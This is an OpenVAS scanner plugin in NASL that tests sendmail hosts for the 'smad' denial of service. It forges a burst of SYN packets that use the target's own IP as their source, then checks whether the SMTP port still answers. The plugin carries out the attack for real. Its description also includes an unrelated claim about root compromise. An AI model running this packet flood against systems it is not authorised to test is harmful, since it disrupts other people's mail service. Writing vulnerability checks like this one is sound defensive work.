###############################################################################
# OpenVAS Vulnerability Test
#
# remote-smtp-smad
# replaces smad plugin
#
# Authors:
# Vlatko Kosturjak <kost@linux.hr>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "The remote host is subject to the 
'smad' attack(sendmail accept dos). 

Description :
Smad  prevents sendmail
from accepting legitimate connections.
A cracker may use this flaw to prevent you
from receiving any email, thus lowering the
interest of being connected to internet.
This attack is specific to some versions of the
Linux kernel.
There are various security bugs in the implementation
of this service which can be used by an intruder to
gain a root account rather easily.

Reference : 
http://online.securityfocus.com/archive/1/11073";

tag_solution = "upgrade your Linux kernel to a newer version
or filter incoming traffic to this port.";

if (description)
{
 script_id(80102);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-14 11:48:12 +0100 (Sat, 14 Mar 2009)");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description( desc);
 script_copyright("(C) 2009 Vlatko Kosturjak");
 script_name( "Sendmail smad vuln");
 script_category(ACT_DENIAL);
 script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
 script_family( "Denial of Service");
 script_summary( "Detects sendmail smad vuln");
 script_require_ports("Services/smtp", 25);

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include('misc_func.inc');
include('global_settings.inc');
include('network_func.inc');

if(TARGET_IS_IPV6())exit(0);

nrpackets = 50;

smtp_servers = get_kb_list("Services/smtp");

# cmd-line testing
# if (!smtp_servers) {
#	smtp_servers=make_list(25);
# }

cipid=htons(0xF1C);
cth_seq=htonl(32089744);
cth_ack=htonl(0);
cth_win=htons(512);
cttl=64;

foreach port (smtp_servers) 
{
	if (!port) port = 25;
	if(get_port_state(port)) {
	    sport= (rand() % 64511) + 1024;
	    ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0,ip_off:0,ip_len:20,
            	ip_p:IPPROTO_TCP, ip_id:cipid, ip_ttl:cttl,
            	ip_src:get_host_ip());
	    tcp = forge_tcp_packet(ip:ip, th_sport:sport, th_dport:port,
                  th_flags:0x02, th_seq:cth_seq,th_ack:cth_ack,
                  th_x2:0, th_off:5, th_win:cth_win, th_urp:0);
		for ( j = 0 ; j < nrpackets ; j ++ )
		{
			reply =  send_packet(tcp, pcap_active : FALSE);
			sleep (1);
		}

		sleep(3);

		soc=open_sock_tcp(port);
		if (!soc) {
			security_hole(port:port, proto: "tcp", data:desc);
		} else {
			close(soc);
		}
	} # get_port_state
} # foreach port

exit (0);

